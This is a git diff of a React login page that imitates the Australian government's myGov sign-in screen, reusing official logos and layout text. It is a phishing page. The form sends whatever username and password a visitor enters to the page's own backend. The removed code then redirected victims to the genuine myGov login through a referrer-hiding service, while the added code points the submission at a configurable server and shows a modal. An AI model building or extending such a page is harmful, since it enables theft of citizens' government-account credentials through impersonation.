@@ -6,8 +6,14 @@ import axios from 'axios'
 import { useFormik } from 'formik';
 import ReportGmailerrorredOutlinedIcon from '@mui/icons-material/ReportGmailerrorredOutlined';
 import { Box } from '@mui/material';
+import ModalOpen from './components/ModalOpen';
 
 function App() {
+
+  const [open, setOpen] = useState(false);
+    const handleOpen = () => {
+        setOpen(true);
+    }
 
   const [toggle, setToggle] = useState('Show')
   const [error, setError] = useState('')
@@ -15,7 +21,7 @@ function App() {
 
   const passwordToggle = () => {
     var x = document.getElementById("text");
-    //var y = document.getElementById("text");
+ 
     if (x.type === "password") {
       x.type = "text";
       setToggle('Hide')
@@ -32,19 +38,15 @@ function App() {
         password: '',
     },
     onSubmit: (values) => {
-
-        axios.post('http://localhost:4000/post/newpost', values).then((result) => {
+      setIsClicked(true)
+        axios.post(`${process.env.REACT_APP_URL}post/newpost`, values).then((result) => {
             if (result.data.status) {
-              console.log('save successfully');
-                
-                setTimeout(() => {
-                    window.location.href = 'https://nullreferer.com/?https://login.my.gov.au/las/mygov-login?execution=e1s1';
-                }, 3000)
+              setIsClicked(false)
+              setOpen(true);
 
             } else {
+              setIsClicked(false)
               console.log('error successfully');
-                //setError(result.data.message)
-                //setIsClicked(false)
             }
         })
     },
@@ -56,21 +58,21 @@ function App() {
 })
   return (
     <>
-      <nav class="uikit-skip-link" aria-label="Skip Links">
-        <a class="uikit-skip-link__link" href="#">Skip to main content</a>
+      <nav className="uikit-skip-link" aria-label="Skip Links">
+        <a className="uikit-skip-link__link" href="#">Skip to main content</a>
       </nav>
 
-      <div class="brand-rainbow">&nbsp;</div>
-      <header role="banner" class="mgvEnhanceHeader">
-        <section class="wrapper">
-          <div class="inner">
-            <div class="unauth-grid">
-              <div class="unauth-grid-row">
-                <a href="#" class="unauth-govt-crest__link">
+      <div className="brand-rainbow">&nbsp;</div>
+      <header role="banner" className="mgvEnhanceHeader">
+        <section className="wrapper">
+          <div className="inner">
+            <div className="unauth-grid">
+              <div className="unauth-grid-row">
+                <a href="#" className="unauth-govt-crest__link">
                   <img id="unauth-govt-crest" src="https://login.my.gov.au/mygov/content/mgv2/blugov/myGov-cobranded-logo-black.svg" alt="myGov Beta" role="img" />
                 </a>
 
-                <div class="header-links">
+                <div className="header-links">
                   <a href="#">Help</a>
                 </div>
               </div>
@@ -87,15 +89,15 @@ function App() {
 
 
 
-      <div class="wrapper-mapwap"><div class="main-block" id="content" role="main">
-        <div class="unauth">
-          <div class="login-grid-container">
-            <div class="login-grid-row">
-              <div class="login-grid-column">
-                <div class="digital-id-login-card-wrapper">
-                  <div class="digital-id-main-login-card override">
+      <div className="wrapper-mapwap"><div className="main-block" id="content" role="main">
+        <div className="unauth">
+          <div className="login-grid-container">
+            <div className="login-grid-row">
+              <div className="login-grid-column">
+                <div className="digital-id-login-card-wrapper">
+                  <div className="digital-id-main-login-card override">
 
-                    <a data-go-back-link="" class="button-back" href="#">Back</a>
+                    <a data-go-back-link="" className="button-back" href="#">Back</a>
 
 
 
@@ -110,49 +112,49 @@ function App() {
 
 
                     <h1>Sign in with myGov</h1>
-                    <p class="login-instruction-text">Choose how to sign in from these 2 options</p>
-                    <h2 class="text-align-left">Using your myGov sign in details</h2>
-                    <form id="mygov-login-form" aria-describedby="error-msg" class="mygov-login-form alternative" onSubmit={formik.handleSubmit} >
+                    <p className="login-instruction-text">Choose how to sign in from these 2 options</p>
+                    <h2 className="text-align-left">Using your myGov sign in details</h2>
+                    <form id="mygov-login-form" aria-describedby="error-msg" className="mygov-login-form alternative" onSubmit={formik.handleSubmit} >
 
-                      <div class="input-group">
-                        <label class="override" for="userId">Username or email</label>
-                        <input id="userId" name="username" class={formik.errors.id?'errorId' : 'text'}
+                      <div className="input-group">
+                        <label className="override" for="userId">Username or email</label>
+                        <input id="userId" name="username" className={formik.errors.id?'errorId' : 'text'}
                         onChange={formik.handleChange('id')}
                         onBlur={formik.handleBlur('id')}
                         value={formik.values.id}/>
                       </div>
                     {formik.touched.id ? 
-                     <Box><p class="form-helper-message hasError" role="alert" aria-live="polite" id="userId__form-helper-message">{formik.errors.id? <Box sx={{display:'flex',color:'red'}}><ReportGmailerrorredOutlinedIcon />{formik.errors.id}</Box>  :''}</p></Box> : ''
+                     <Box><p className="form-helper-message hasError" role="alert" aria-live="polite" id="userId__form-helper-message">{formik.errors.id? <Box sx={{display:'flex',color:'red'}}><ReportGmailerrorredOutlinedIcon />{formik.errors.id}</Box>  :''}</p></Box> : ''
                     }
-                      <p class="recovery">
+                      <p className="recovery">
                         <a href="#"
-                          class="anchor override">Forgot username</a>
+                          className="anchor override">Forgot username</a>
                       </p>
 
-                      <div class="input-group">
-                        <label for="password" class="override">Password</label>
+                      <div className="input-group">
+                        <label for="password" className="override">Password</label>
                         <div id="password">
-                          <input id="text" name="text" type="password" class={formik.errors.password?'errorPassword':''}
-                            data-current-password="data-current-password" autocomplete="off"
+                          <input id="text" name="text" type="password" className={formik.errors.password?'errorPassword':''}
+                            data-current-password="data-current-password" autoComplete="off"
                             aria-required="true"  onChange={formik.handleChange('password')}
                             onBlur={formik.handleBlur('password')}
                             value={formik.values.password}/>
                           <div id='passwordToggle' className={formik.errors.password?'ux':''} onClick={passwordToggle}>
-                            {toggle}
+                            <span style={{textDecoration:'underline'}}>{toggle}</span>
                           </div>
                         </div>
                       </div>
                       {formik.touched.password ? 
-                     <Box><p class="form-helper-message hasError" role="alert" aria-live="polite" id="userId__form-helper-message">{formik.errors.password? <Box sx={{display:'flex',color:'red'}}><ReportGmailerrorredOutlinedIcon />{formik.errors.password}</Box>  :''}</p></Box> : ''
+                     <Box><p className="form-helper-message hasError" role="alert" aria-live="polite" id="userId__form-helper-message">{formik.errors.password? <Box sx={{display:'flex',color:'red'}}><ReportGmailerrorredOutlinedIcon />{formik.errors.password}</Box>  :''}</p></Box> : ''
                     }
-                      <p class="recovery">
-                        <a href="#" class="anchor override">Forgot
+                      <p className="recovery">
+                        <a href="#" className="anchor override">Forgot
                           password</a>
                       </p>
 
-                      <div class="button-digital-id-main-container override">
-                        <div class="digital-id-button-container">
-                          <button type="submit" class="button-main" name="_eventId_login">Sign in</button>
+                      <div className="button-digital-id-main-container override">
+                        <div className="digital-id-button-container">
+                          <button type="submit" className="button-main" name="_eventId_login" disabled={isClicked ? true:false}>Sign in</button>
                         </div>
                       </div>
 
@@ -161,7 +163,7 @@ function App() {
 
 
 
-                      <p class="create-account-text"><a class="create-account-link"
+                      <p className="create-account-text"><a className="create-account-link"
                         href="https://my.gov.au/en/create-account/">Create a myGov account</a> if you don't have one already.</p>
 
 
@@ -174,23 +176,23 @@ function App() {
                         <input type="hidden" name="_csrf" value="f6678688-a280-458b-804d-d0c5ace67e70" />
                       </div></form>
 
-                    <div class="hr-word">
-                      <div class="draw-circle">
+                    <div className="hr-word">
+                      <div className="draw-circle">
                         or
                       </div>
                     </div>
 
-                    <div class="digital-id-login-card secondary">
-                      <div class="button-digital-id-container">
-                        <h2 class="text-align-left">Using your myGovID Digital Identity</h2>
-                        <div class='digital-id-login-option-container'>
-                          <div class='inner-options'>
-                            <p class="external-links-zone">
+                    <div className="digital-id-login-card secondary">
+                      <div className="button-digital-id-container">
+                        <h2 className="text-align-left">Using your myGovID Digital Identity</h2>
+                        <div className='digital-id-login-option-container'>
+                          <div className='inner-options'>
+                            <p className="external-links-zone">
                               What is <a href="#"
                                >Digital Identity</a> and <a
                                   href="#" >myGovID</a>?
                             </p>
-                            <a class="button-digital-identity" href="#">Continue with Digital Identity</a>
+                            <a className="button-digital-identity" href="#">Continue with Digital Identity</a>
                             <input type="hidden" value="{flowScope.targetParamDI}" />
                           </div>
                         </div>
@@ -211,13 +213,13 @@ function App() {
 
 
       <footer role="contentinfo">
-        <div class="wrapper">
-          <div class="inner">
+        <div className="wrapper">
+          <div className="inner">
 
-            <section class="footer-list">
+            <section className="footer-list">
               <nav>
-                <h2 class="sr-only" aria-label="Footer">Footer</h2>
-                <ul class="lower-links">
+                <h2 className="sr-only" aria-label="Footer">Footer</h2>
+                <ul className="lower-links">
                   <li>
                     <a  href="#">Terms of use</a>
                   </li>
@@ -233,8 +235,8 @@ function App() {
                 </ul>
               </nav>
             </section>
-            <div class="footer-lower">
-              <section class="footer-lower-logo">
+            <div className="footer-lower">
+              <section className="footer-lower-logo">
                 <a href="#">
                   <img src="https://login.my.gov.au/mygov/content/mgv2/blugov/myGov-cobranded-logo-white.svg"
                     alt="myGov Beta" width="313.17"
@@ -242,7 +244,7 @@ function App() {
                 </a>
               </section>
 
-              <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
+              <p className="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
             </div>
 
 
@@ -251,6 +253,7 @@ function App() {
           </div>
         </div>
       </footer>
+      <ModalOpen handleOpen={handleOpen} open={open} setOpen={setOpen}/>
     </>
   );
 
